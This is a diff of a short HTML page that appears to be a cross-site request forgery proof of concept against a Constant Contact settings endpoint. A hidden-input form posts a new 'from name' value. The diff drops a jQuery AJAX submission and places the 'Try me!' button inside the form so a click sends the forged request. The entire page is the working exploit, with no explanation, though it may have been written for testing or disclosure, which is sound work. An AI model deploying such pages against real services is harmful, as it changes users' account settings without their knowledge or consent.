@@ -7,21 +7,8 @@
 <body>
 <form id="myForm" action="https://ui.constantcontact.com/xhr/settings/EditFromName" method="post">
   <input name="oldValue" value="My old value" type="hidden">
-  <input name="value" value="I hate my poop" type="hidden">
+  <input name="value" value="I hate my poopaa" type="hidden">
+  <button>Try me!</button>
 </form>
-<button>Try me!</button>
-<script>
-$("button").click(function(event){
-	event.preventDefault();
-    $.ajax({
-		type: "POST",
-		url: "https://ui.constantcontact.com/xhr/settings/EditFromName",
-		data:$('#myForm').serialize(),
-		success: function() {
-			console.log('done');
-		}
-	});
-});
-</script>
 </body>
 </html>
